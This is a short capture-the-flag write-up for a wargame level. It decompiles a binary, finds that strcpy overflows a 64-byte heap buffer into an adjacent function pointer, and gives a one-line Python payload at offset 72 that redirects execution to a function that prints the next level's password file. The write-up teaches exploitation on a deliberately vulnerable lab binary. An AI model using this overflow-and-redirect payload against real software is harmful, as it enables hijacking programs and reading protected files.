Here is the decompiled code :

```c
void n(void)

{
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  puts("Nope");
  return;
}

void main(undefined4 param_1,int param_2)

{
  char *__dest;
  undefined4 *puVar1;

  __dest = (char *)malloc(0x40);
  puVar1 = (undefined4 *)malloc(4);
  *puVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (*(code *)*puVar1)();
  return;
}
```

We see in our main that m() function is called, and that we have another function called n(). We have a malloc of size 0x40 (64bytes in decimal). We can try a heap buffer overflow.

The address of n() is 0x08048454

Let's use https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to find the offset in order to exploit the overflow.

The offset is 72.

So if we put the address of n() at the offset of the buffer, we will land in the n() function and it will print the token.

`./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')`
